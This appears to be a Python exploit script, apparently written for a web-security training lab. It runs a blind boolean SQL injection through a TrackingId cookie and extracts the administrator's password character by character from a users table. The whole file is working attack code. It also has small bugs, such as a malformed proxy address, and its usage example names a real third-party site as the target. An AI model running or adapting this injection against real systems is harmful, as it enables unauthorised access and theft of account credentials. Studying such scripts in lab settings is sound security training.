from http import cookies
import requests
import urllib3, urllib.parse
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0,1:8080', 'https': '127.0.0.1:8080'}

# Retrieves administrator's password 
def exploit_getPasswd(url):
    passwdExtracted = ""
    for i in range(1, 21):
        for j in range(32, 126):
            payload = f"' AND (SELECT ascii(SUBSTRING(password,{i},1)) FROM users WHERE username = 'administrator') = '{j}'--"
            enc_payload = urllib.parse.quote_plus(payload)
            cookies = {'TrackingId': 'D2yK3AfgiQNQdvWt' + enc_payload, 
            'session': 'L52gFCIW8LZ0NrBhnxOfElgay2t6HZna'
            }
            r = requests.get(url, cookies=cookies, proxies = proxies, verify=False)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + passwdExtracted + chr(j))
                sys.stdout.flush()
            else:
                passwdExtracted += chr(j)
                sys.stdout.write('\r' + passwdExtracted)
                sys.stdout.flush()
                break

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[.] Usage: %s <url>' % sys.argv[0])
        print('[.] Example: %s www.google.com' % sys.argv[0])
    print('[.] Getting admin password..')
    exploit_getPasswd(url)    